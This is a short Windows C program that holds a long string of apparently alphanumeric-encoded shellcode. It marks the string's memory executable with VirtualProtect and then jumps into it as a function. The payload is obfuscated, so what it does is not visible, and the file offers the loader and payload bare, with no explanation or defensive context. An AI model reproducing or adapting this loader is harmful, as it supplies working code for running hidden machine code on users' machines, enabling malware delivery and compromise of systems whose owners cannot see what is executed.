#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    char *aaa = \
    "PQRSVWh4321XH-5321P4/P^YQ1L40ZQ1L44_T[WXH5YM>,H56\"QCPhV-j~XH59t2B1"
    "D440L440L47hwkX9XH5/#,%Pf1L42hw#8<XH5(}cf1D44ht-)2XH55thjPh91>vXH5g"
    "kg-1D44hXT(,XH5s6ipPf1L40h=.=lXH5|u|61D44WXH5RA8SH5R|p/P0L42hrgtkXH"
    "5aG5k1D440L440L47h3]JoXH5V%/?Ph,]LxXH5d+R01D44f1L45h<|t>XH5n43]P0L4"
    "2h#N_JXH5B\"<d1D44h;U0!XH5:syWP0L410L43hS5uGXH5`}Dj1D440L440L47h:b>"
    ",XH5NntmP0L40h6MH,XH5BA?`1D440L440L46hDDShXH52,mTP0L40hLwZ$XH59_<e1"
    "D440L45RXH5$VZNH5eWaZPf1L42hx32lXH5urLo1D440L45h-k5aXH5VTAhPf1L40h="
    "eB5XH5|[q$1D44f1L45hkySrXH5J1bMP0L400L43h-{0fXH5`J+51D44f1L46WXH5-W"
    "y.H5-a8ZP0L42he?:TXH5QIvU1D440L45hti-{XH5>}eJPh}\\m}XH5t;q,1D440L44"
    "0L46hs&ILXH5WkHiP0L43h\"sO6XH5jByB1D44f1L46hpJ+rXH5qlfCP0L41hu:]sXH"
    "5X~)!1D440L440L46h8WH(XH5uf~lP0L42h!gtnXH5U-T#1D440L44hT=!)XH5kyUkP"
    "0L400L42hl!TVXH5plUq1D440L47hWQE;XH5#ENwP0L40htzrsXH5u_?B1D440L45RX"
    "H5yzlzH55{H2P0L42hUg=NXH5dQs91D440L44h;}3AXH5`]z7P0L43hJ2qVXH5nF*j1"
    "D44f1L44h:MJ\"XH5r9QjP0L41h6c6.XH5Bx~Z1D440L440L47h?R=lXH5w&ftP0L41"
    "hq$~mXH59P%M1D440L45ht~DIXH5<O`,P0L42h.Sr'XH5f')G1D440L45h(f1-XH5y'"
    "clPhi3.PXH5:rz31D440L47h63+#XH5f`zqPh1w!<XH5g6q}1D44\xff\xe4";

    int oldp;
    VirtualProtect(aaa, (unsigned int)strlen(aaa), PAGE_EXECUTE_READWRITE, &oldp);
    ((void(*)())aaa)();
    return 0;
}